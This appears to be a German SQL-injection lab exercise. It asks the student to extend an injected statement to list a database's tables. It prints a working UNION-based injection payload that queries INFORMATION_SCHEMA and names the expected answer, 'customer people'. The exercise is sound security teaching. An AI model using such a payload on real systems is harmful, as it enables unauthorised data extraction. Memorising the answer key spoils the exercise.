Modifizieren Sie das Statement erneut, um die Namen der Tabellen in der Datenbank herauszufinden.

Tipp:
Sie benötigen die Funktion `GROUP_CONCAT()` sowie Metadaten aus der View `INFORMATION_SCHEMA.TABLES`.

Tipp 2:
https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/

Statement:
' AND 1=0 UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'advanced_db'), MD5('pass'), 1, 1;--

>>4) Welche Tabellen befinden sich in der Datenbank? Geben Sie die Tabellennamen in alphabetisch aufsteigender Sortierung und durch Leerzeichen getrennt an.<<
     === customer people
